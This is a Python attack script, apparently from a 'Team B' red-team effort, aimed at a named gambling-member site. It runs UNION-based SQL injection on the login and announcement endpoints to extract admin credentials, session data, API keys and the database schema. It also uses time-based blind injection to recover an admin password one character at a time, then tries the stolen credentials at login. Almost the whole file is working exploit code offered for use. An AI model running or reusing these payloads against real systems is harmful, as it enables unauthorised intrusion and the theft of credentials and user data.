#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Admin Data Extractor - Team B Panama8888b
เครื่องมือดึงข้อมูล Admin Users และ Database Schema
เพื่อยืนยันการรั่วไหลข้อมูลจริงและผลกระทบ
"""

import requests
import time
import json
import sys
import warnings
import urllib.parse
import base64
import hashlib
from datetime import datetime
import re

warnings.filterwarnings('ignore')

class AdminDataExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.co"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        
        self.critical_evidence = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'admin_users_found': [],
            'database_schema': {},
            'data_leak_confirmed': False,
            'security_impact': 'CRITICAL'
        }
        
    def log_message(self, message, level="INFO"):
        """บันทึกข้อความพร้อม timestamp และสี"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m",
            "ALERT": "\033[41m\033[97m"  # Red background, white text
        }
        reset = "\033[0m"
        color = colors.get(level, "")
        print(f"{color}[{timestamp}] [{level}] {message}{reset}")
        
    def extract_admin_credentials_advanced(self):
        """ดึงข้อมูล admin users อย่างละเอียด"""
        self.log_message("🎯 เริ่มการดึงข้อมูล Admin Users - CRITICAL TEST", "ALERT")
        
        url = f"{self.base_url}/auth/login"
        
        # Advanced Admin extraction payloads
        admin_payloads = [
            # ดึงข้อมูล admin จากตาราง users
            "test' UNION SELECT id,username,password FROM users WHERE role='admin' OR is_admin=1 OR user_type='admin'--",
            "test' UNION SELECT username,password,email FROM admin_users LIMIT 5--",
            "test' UNION SELECT login,password,privilege FROM administrators LIMIT 5--",
            "test' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--",
            
            # ดึงข้อมูล superuser
            "test' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator') LIMIT 3--",
            "test' UNION SELECT id,email,password FROM users WHERE email LIKE '%admin%' OR email LIKE '%panama%'--",
            
            # ดึงข้อมูลจาก session และ API keys
            "test' UNION SELECT user_id,session_data,created_at FROM user_sessions WHERE user_id IN (SELECT id FROM users WHERE role='admin')--",
            "test' UNION SELECT api_key,secret_key,user_id FROM api_credentials WHERE user_id IN (SELECT id FROM users WHERE role='admin')--"
        ]
        
        admin_found = []
        
        for i, payload in enumerate(admin_payloads):
            try:
                self.log_message(f"⚡ ทดสอบ Admin Payload {i+1}/{len(admin_payloads)}: {payload[:50]}...", "CRITICAL")
                
                data = {
                    '_token': payload,
                    'email': 'test@test.com',
                    'password': 'test123'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                # วิเคราะห์ response สำหรับข้อมูล admin
                if response.status_code == 200:
                    admin_data = self.parse_admin_from_response(response.text)
                    if admin_data:
                        admin_found.extend(admin_data)
                        self.log_message(f"💀 CRITICAL: พบข้อมูล Admin - {len(admin_data)} รายการ", "ALERT")
                        
                        # แสดงข้อมูลที่พบทันที
                        for admin in admin_data:
                            if 'username' in admin and 'password' in admin:
                                self.log_message(f"🔑 LEAKED ADMIN: {admin['username']} / {admin['password']}", "ALERT")
                                
                elif response.status_code == 500:
                    # SQL Error ที่อาจเปิดเผยข้อมูล
                    error_admin = self.extract_admin_from_error(response.text)
                    if error_admin:
                        admin_found.extend(error_admin)
                        self.log_message(f"💥 SQL ERROR LEAK: พบข้อมูล Admin จาก Error", "ALERT")
                        
                # หน่วงเวลาเพื่อหลีกเลี่ยง rate limiting
                time.sleep(2)
                
            except Exception as e:
                self.log_message(f"❌ Error: {str(e)}", "ERROR")
                
        if admin_found:
            self.critical_evidence['admin_users_found'] = admin_found
            self.critical_evidence['data_leak_confirmed'] = True
            
        return admin_found
        
    def extract_database_schema_detailed(self):
        """ดึงข้อมูล Database Schema แบบละเอียด"""
        self.log_message("🗄️ เริ่มการดึง Database Schema - STRUCTURE LEAK TEST", "ALERT")
        
        url = f"{self.base_url}/api/announcement"
        
        # Database schema extraction payloads
        schema_payloads = [
            # SQLite schema extraction
            "active' UNION SELECT name,sql,type FROM sqlite_master WHERE type='table' ORDER BY name--",
            "active' UNION SELECT name,sql,'view' FROM sqlite_master WHERE type='view'--",
            "active' UNION SELECT name,sql,'index' FROM sqlite_master WHERE type='index'--",
            
            # Table information
            "active' UNION SELECT 'PRAGMA',sql,'pragma' FROM (SELECT 'table_info('||name||')' as sql FROM sqlite_master WHERE type='table')--",
            "active' UNION SELECT tbl_name,sql,'schema' FROM sqlite_master WHERE sql IS NOT NULL--",
            
            # MySQL/PostgreSQL schema (fallback)
            "active' UNION SELECT table_name,column_name,data_type FROM information_schema.columns LIMIT 10--",
            "active' UNION SELECT table_schema,table_name,table_type FROM information_schema.tables--"
        ]
        
        schema_info = {}
        
        for i, payload in enumerate(schema_payloads):
            try:
                self.log_message(f"📊 ทดสอบ Schema Payload {i+1}/{len(schema_payloads)}", "CRITICAL")
                
                data = {
                    'status': payload,
                    'title': 'test'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                if response.status_code == 200:
                    schema_data = self.parse_schema_from_response(response.text)
                    if schema_data:
                        schema_info.update(schema_data)
                        self.log_message(f"💀 SCHEMA LEAK: พบโครงสร้างฐานข้อมูล", "ALERT")
                        
                        # แสดงตารางที่พบ
                        for key, value in schema_data.items():
                            if 'table' in key.lower() or 'name' in key.lower():
                                self.log_message(f"📋 TABLE FOUND: {key} = {value}", "ALERT")
                                
                time.sleep(2)
                
            except Exception as e:
                self.log_message(f"❌ Error: {str(e)}", "ERROR")
                
        if schema_info:
            self.critical_evidence['database_schema'] = schema_info
            
        return schema_info
        
    def extract_critical_tables_data(self):
        """ดึงข้อมูลจากตารางสำคัญ"""
        self.log_message("🔥 เริ่มการดึงข้อมูลจากตารางสำคัญ", "ALERT")
        
        url = f"{self.base_url}/api/announcement"
        
        # ตารางที่น่าสนใจ
        critical_tables = ['users', 'admin_users', 'accounts', 'members', 'administrators', 'user_accounts']
        
        table_data = {}
        
        for table in critical_tables:
            try:
                self.log_message(f"🎯 ทดสอบตาราง: {table}", "CRITICAL")
                
                # ดึงข้อมูลจากตาราง
                payload = f"active' UNION SELECT * FROM {table} LIMIT 3--"
                
                data = {
                    'status': payload,
                    'title': 'test'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                if response.status_code == 200:
                    extracted_data = self.parse_table_data(response.text, table)
                    if extracted_data:
                        table_data[table] = extracted_data
                        self.log_message(f"💀 DATA LEAK จาก {table}: {len(extracted_data)} records", "ALERT")
                        
                        # แสดงข้อมูลตัวอย่าง
                        for record in extracted_data[:2]:
                            self.log_message(f"📄 SAMPLE: {str(record)[:100]}...", "ALERT")
                            
                time.sleep(3)
                
            except Exception as e:
                self.log_message(f"❌ Error testing {table}: {str(e)}", "ERROR")
                
        return table_data
        
    def blind_extract_admin_password(self):
        """ดึง admin password ด้วย Blind SQL Injection"""
        self.log_message("🕵️ เริ่ม Blind Extraction สำหรับ Admin Password", "ALERT")
        
        url = f"{self.base_url}/public/js/v2/app.js"
        
        # ทดสอบว่ามี admin user หรือไม่
        test_payload = "25.1 / case when (SELECT COUNT(*) FROM users WHERE role='admin') > 0 then randomblob(5000000) else 1 end"
        
        try:
            params = {'v': test_payload}
            start_time = time.time()
            response = self.session.get(url, params=params, timeout=60)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            if response_time > 3:
                self.log_message(f"💀 CONFIRMED: มี Admin users ในระบบ (response time: {response_time:.2f}s)", "ALERT")
                
                # ดึงชื่อ admin แรก
                admin_username = self.blind_extract_admin_username(url)
                if admin_username:
                    self.log_message(f"🔑 ADMIN USERNAME: {admin_username}", "ALERT")
                    
                    # ดึง password ของ admin
                    admin_password = self.blind_extract_password_for_user(url, admin_username)
                    if admin_password:
                        self.log_message(f"🔑 ADMIN PASSWORD: {admin_password}", "ALERT")
                        
                        return {'username': admin_username, 'password': admin_password}
                        
        except Exception as e:
            self.log_message(f"❌ Error in blind extraction: {str(e)}", "ERROR")
            
        return None
        
    def blind_extract_admin_username(self, url, max_length=20):
        """ดึงชื่อ admin ด้วย Blind SQL Injection"""
        self.log_message("🔍 กำลังดึงชื่อ Admin User...", "CRITICAL")
        
        username = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            # ทดสอบตัวอักษร
            test_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.'
            
            for char in test_chars:
                try:
                    payload = f"25.1 / case when (SELECT SUBSTR(username,{pos},1) FROM users WHERE role='admin' LIMIT 1)='{char}' then randomblob(3000000) else 1 end"
                    
                    params = {'v': payload}
                    start_time = time.time()
                    response = self.session.get(url, params=params, timeout=45)
                    end_time = time.time()
                    
                    if (end_time - start_time) > 2:
                        username += char
                        found_char = True
                        self.log_message(f"🔤 Found char: {username}", "SUCCESS")
                        break
                        
                    time.sleep(0.5)
                    
                except:
                    continue
                    
            if not found_char:
                break
                
        return username if username else None
        
    def blind_extract_password_for_user(self, url, username, max_length=30):
        """ดึง password สำหรับ username ที่ระบุ"""
        self.log_message(f"🔐 กำลังดึง Password สำหรับ: {username}", "CRITICAL")
        
        password = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            # ทดสอบตัวอักษรสำหรับ password
            test_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-='
            
            for char in test_chars:
                try:
                    payload = f"25.1 / case when (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='{username}')='{char}' then randomblob(3000000) else 1 end"
                    
                    params = {'v': payload}
                    start_time = time.time()
                    response = self.session.get(url, params=params, timeout=45)
                    end_time = time.time()
                    
                    if (end_time - start_time) > 2:
                        password += char
                        found_char = True
                        self.log_message(f"🔑 Password progress: {password}", "SUCCESS")
                        break
                        
                    time.sleep(0.5)
                    
                except:
                    continue
                    
            if not found_char:
                break
                
        return password if password else None
        
    def parse_admin_from_response(self, response_text):
        """แยกข้อมูล admin จาก response"""
        admin_users = []
        
        # ลบ HTML tags
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # หา patterns ของ admin data
        patterns = [
            r'admin[_-]?([a-zA-Z0-9]+)[^\s]*[\s]*([a-zA-Z0-9!@#$%^&*]+)',  # admin username password
            r'username["\s]*[:=]["\s]*([a-zA-Z0-9_-]+)[^,]*password["\s]*[:=]["\s]*([a-zA-Z0-9!@#$%^&*]+)',
            r'([a-zA-Z0-9_-]+)[^\s]*[\s]*([a-zA-Z0-9!@#$%^&*]{6,})[^\s]*admin',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            for match in matches:
                if len(match) >= 2:
                    admin_users.append({
                        'username': match[0],
                        'password': match[1],
                        'extracted_from': 'response_parsing'
                    })
                    
        return admin_users
        
    def extract_admin_from_error(self, error_text):
        """ดึงข้อมูล admin จาก SQL errors"""
        admin_data = []
        
        # Patterns สำหรับ SQL errors ที่เปิดเผยข้อมูล
        error_patterns = [
            r"INSERT INTO users.*VALUES.*'([^']+)'.*'([^']+)'.*admin",
            r"admin[_-]?([a-zA-Z0-9]+)[^\s]*[\s]*([a-zA-Z0-9!@#$%^&*]+)",
            r"Table '([^']*admin[^']*)'",
            r"Column '([^']*password[^']*)'",
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple) and len(match) >= 2:
                    admin_data.append({
                        'username': match[0],
                        'password': match[1],
                        'extracted_from': 'sql_error'
                    })
                    
        return admin_data
        
    def parse_schema_from_response(self, response_text):
        """แยกข้อมูล schema จาก response"""
        schema_data = {}
        
        # ลบ HTML tags
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # Patterns สำหรับ database schema
        schema_patterns = [
            r'CREATE TABLE ([a-zA-Z_][a-zA-Z0-9_]*)',
            r'TABLE_NAME["\s]*[:=]["\s]*([a-zA-Z0-9_]+)',
            r'([a-zA-Z_][a-zA-Z0-9_]*)\s+table',
            r'table["\s]*[:=]["\s]*([a-zA-Z0-9_]+)',
        ]
        
        table_count = 0
        for pattern in schema_patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            for match in matches:
                table_name = match if isinstance(match, str) else match[0]
                if len(table_name) > 2:
                    schema_data[f'table_{table_count}'] = table_name
                    table_count += 1
                    
        return schema_data
        
    def parse_table_data(self, response_text, table_name):
        """แยกข้อมูลจากตาราง"""
        # ลบ HTML tags
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # หาข้อมูลที่น่าสนใจ
        data_patterns = [
            r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # emails
            r'admin[a-zA-Z0-9_-]*',  # admin usernames
            r'[a-zA-Z0-9_-]{6,20}',  # potential usernames/passwords
        ]
        
        extracted_data = []
        for pattern in data_patterns:
            matches = re.findall(pattern, clean_text)
            extracted_data.extend(matches[:5])  # เก็บ 5 รายการแรก
            
        return extracted_data
        
    def verify_admin_access(self, username, password):
        """ทดสอบการเข้าสู่ระบบด้วย admin credentials"""
        self.log_message(f"🔐 ทดสอบการเข้าสู่ระบบ: {username}/{password}", "CRITICAL")
        
        login_url = f"{self.base_url}/auth/login"
        
        try:
            # ทดสอบ login
            data = {
                'email': username,
                'password': password,
                '_token': 'test'
            }
            
            response = self.session.post(login_url, data=data)
            
            if 'dashboard' in response.text.lower() or 'admin' in response.text.lower():
                self.log_message(f"💀 CRITICAL: Login สำเร็จด้วย {username}/{password}", "ALERT")
                return True
            elif response.status_code == 302:  # Redirect อาจเป็นการ login สำเร็จ
                self.log_message(f"⚠️ Possible successful login (redirect)", "WARNING")
                return True
                
        except Exception as e:
            self.log_message(f"❌ Error testing login: {str(e)}", "ERROR")
            
        return False
        
    def run_critical_extraction(self):
        """รันการดึงข้อมูลสำคัญทั้งหมด"""
        self.log_message("🚨 เริ่มการทดสอบการรั่วไหลข้อมูลสำคัญ", "ALERT")
        self.log_message("🎯 TARGET: Admin Users + Database Schema Extraction", "ALERT")
        
        results = {
            'extraction_timestamp': datetime.now().isoformat(),
            'admin_users': [],
            'database_schema': {},
            'table_data': {},
            'blind_extraction': None,
            'login_verification': [],
            'data_leak_severity': 'UNKNOWN'
        }
        
        try:
            # 1. ดึงข้อมูล Admin แบบ Advanced
            self.log_message("1️⃣ ขั้นตอนที่ 1: Advanced Admin Extraction", "CRITICAL")
            admin_users = self.extract_admin_credentials_advanced()
            results['admin_users'] = admin_users
            
            # 2. ดึง Database Schema
            self.log_message("2️⃣ ขั้นตอนที่ 2: Database Schema Extraction", "CRITICAL")
            schema_info = self.extract_database_schema_detailed()
            results['database_schema'] = schema_info
            
            # 3. ดึงข้อมูลจากตารางสำคัญ
            self.log_message("3️⃣ ขั้นตอนที่ 3: Critical Tables Data Extraction", "CRITICAL")
            table_data = self.extract_critical_tables_data()
            results['table_data'] = table_data
            
            # 4. Blind Extraction
            self.log_message("4️⃣ ขั้นตอนที่ 4: Blind Admin Password Extraction", "CRITICAL")
            blind_admin = self.blind_extract_admin_password()
            results['blind_extraction'] = blind_admin
            
            # 5. ทดสอบการเข้าสู่ระบบ
            self.log_message("5️⃣ ขั้นตอนที่ 5: Admin Login Verification", "CRITICAL")
            verified_logins = []
            
            # ทดสอบ admin ที่ดึงได้
            all_admins = admin_users[:]
            if blind_admin:
                all_admins.append(blind_admin)
                
            for admin in all_admins:
                if 'username' in admin and 'password' in admin:
                    if self.verify_admin_access(admin['username'], admin['password']):
                        verified_logins.append(admin)
                        
            results['login_verification'] = verified_logins
            
            # ประเมินความรุนแรง
            severity_score = 0
            if admin_users: severity_score += 30
            if schema_info: severity_score += 20
            if table_data: severity_score += 20
            if blind_admin: severity_score += 20
            if verified_logins: severity_score += 10
            
            if severity_score >= 70:
                results['data_leak_severity'] = 'CRITICAL'
            elif severity_score >= 40:
                results['data_leak_severity'] = 'HIGH'
            elif severity_score >= 20:
                results['data_leak_severity'] = 'MEDIUM'
            else:
                results['data_leak_severity'] = 'LOW'
                
            # บันทึกผลลัพธ์
            filename = f"critical_data_leak_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, ensure_ascii=False, indent=2)
                
            # สรุปผลลัพธ์
            self.log_message("=== สรุปผลการทดสอบการรั่วไหลข้อมูล ===", "ALERT")
            self.log_message(f"🔑 Admin Users Found: {len(admin_users)}", "ALERT")
            self.log_message(f"🗄️ Database Tables Found: {len(schema_info)}", "ALERT") 
            self.log_message(f"📊 Table Data Extracted: {len(table_data)}", "ALERT")
            self.log_message(f"🕵️ Blind Extraction: {'SUCCESS' if blind_admin else 'FAILED'}", "ALERT")
            self.log_message(f"✅ Verified Logins: {len(verified_logins)}", "ALERT")
            self.log_message(f"⚠️ SEVERITY: {results['data_leak_severity']}", "ALERT")
            self.log_message(f"📄 Evidence saved: {filename}", "INFO")
            
            # แสดงข้อมูลที่พบ
            if admin_users:
                self.log_message("💀 LEAKED ADMIN CREDENTIALS:", "ALERT")
                for admin in admin_users[:3]:  # แสดง 3 รายการแรก
                    self.log_message(f"   👤 {admin.get('username', 'N/A')} / {admin.get('password', 'N/A')}", "ALERT")
                    
            if schema_info:
                self.log_message("💀 LEAKED DATABASE SCHEMA:", "ALERT")
                for key, value in list(schema_info.items())[:5]:  # แสดง 5 รายการแรก
                    self.log_message(f"   📋 {key}: {value}", "ALERT")
                    
            return results
            
        except Exception as e:
            self.log_message(f"❌ Critical Error: {str(e)}", "ERROR")
            return None

if __name__ == "__main__":
    print("🚨 CRITICAL DATA LEAK TEST - Team B Panama8888b")
    print("🎯 Admin User & Database Schema Extraction")
    print("💀 Testing for REAL data exposure and impact")
    print("="*70)
    
    extractor = AdminDataExtractor()
    results = extractor.run_critical_extraction()
    
    if results:
        print(f"\n🚨 CRITICAL TEST COMPLETED!")
        print(f"🔑 Admin Users: {len(results['admin_users'])}")
        print(f"🗄️ Database Schema: {len(results['database_schema'])}")
        print(f"⚠️ Severity: {results['data_leak_severity']}")
        
        if results['admin_users']:
            print("\n💀 CONFIRMED: Admin credentials exposed!")
            for admin in results['admin_users'][:2]:
                print(f"   {admin.get('username', 'N/A')} / {admin.get('password', 'N/A')}")
                
        if results['database_schema']:
            print("\n💀 CONFIRMED: Database schema exposed!")
            for key, value in list(results['database_schema'].items())[:3]:
                print(f"   {key}: {value}")
    else:
        print("\n❌ Critical test failed")
        
    print("\n" + "="*70)
    print("🔒 WARNING: Real sensitive data may have been exposed!")
    print("💥 This confirms actual security impact and damage potential")